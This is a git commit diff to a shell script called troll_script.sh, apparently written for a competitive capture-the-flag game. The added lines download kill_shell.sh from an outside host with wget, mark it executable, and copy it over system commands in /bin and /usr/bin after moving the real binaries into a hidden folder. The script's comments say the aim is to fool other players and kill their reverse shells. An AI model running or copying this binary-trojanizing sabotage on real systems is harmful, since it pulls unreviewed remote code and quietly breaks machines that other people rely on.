ab47054652f1877a5d0bf3d09bb772a360ccbc55
Daniel Tomov <90072819+Daniel-Tomov@users.noreply.github.com>
2024-04-30 10:33:33 -0400

    feat: kill shell script

--- scripts/troll_script.sh
+++ scripts/troll_script.sh
@@ -4,6 +4,9 @@ target_path=/usr/bin/cageydinosaur
 
 mkdir -p $target_path
 
+wget http://ctf.danieltomov.me/kill_shell.sh -O $target_path/kill_shell
+chmod +x $target_path/kill_shell
+
 # these commands are crucial for the script's functionality, copy them first
 cp $(which cp) $target_path/cp
 cp $(which mv) $target_path/mv
@@ -12,14 +15,14 @@ function delete {
 	which_output=$(which $1)
 	if [[ "$which_output" == *"not found"*  || "$which_output" == "" ]]; then
 		echo "Command $1 not found"
-		$target_path/cp /bin/true /usr/bin/$1 # even if command is not found,
-		$target_path/cp /bin/true /bin/$1     # make a copy of /bin/true to fool other players
+		$target_path/cp $target_path/kill_shell /usr/bin/$1 # even if command is not found,
+		$target_path/cp $target_path/kill_shell /bin/$1     # make a copy of kill_shell to fool other players
 
-	elif [[ $which_output != *$target_path* ]]; then # skip if the path of the binary is in the target_path. Without this check, the binary would get overwritten with /bin/true
+	elif [[ $which_output != *$target_path* ]]; then # skip if the path of the binary is in the target_path. Without this check, the binary would get overwritten with $target_path/kill_shell
 		$target_path/mv $which_output $target_path/$1 # make a copy of the executable for our own use
-		$target_path/cp /bin/true $which_output # copy /bin/true to the path of the target executable
-		$target_path/cp /bin/true /usr/bin/$1   # /bin/true does not output anything
-		$target_path/cp /bin/true /bin/$1    
+		$target_path/cp $target_path/kill_shell $which_output # copy kill_shell to the path of the target executable
+		$target_path/cp $target_path/kill_shell /usr/bin/$1   # kill_shell kills the player's reverse shell
+		$target_path/cp $target_path/kill_shell /bin/$1    
 	fi
 }
 
